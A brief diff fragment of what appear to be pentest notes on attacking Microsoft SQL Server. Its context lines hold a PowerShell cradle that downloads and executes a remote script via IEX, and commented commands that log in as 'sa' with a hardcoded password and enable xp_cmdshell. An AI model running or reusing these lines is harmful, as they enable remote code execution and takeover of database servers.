@@ -3,6 +3,10 @@
 $browser = New-Object System.Net.WebClient
 $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials
 IEX($browser.DownloadString("https://gist.githubusercontent.com/jourdant/e9fa625fec54deb1a31f8e441157fc9f/raw/20cca64e2909033a778c5b56f9040915708de237/sql_cmdlets.psm1"))
+```
+
+```
+
 
 #Invoke-SqlCommand -Server 192.168.100.99 -database master -username sa -password 123456@!@# -query "EXEC sp_databases"
 #$sql = "EXEC sp_configure 'show advanced options',1;reconfigure; exec sp_configure 'xp_cmdshell',1;reconfigure" 
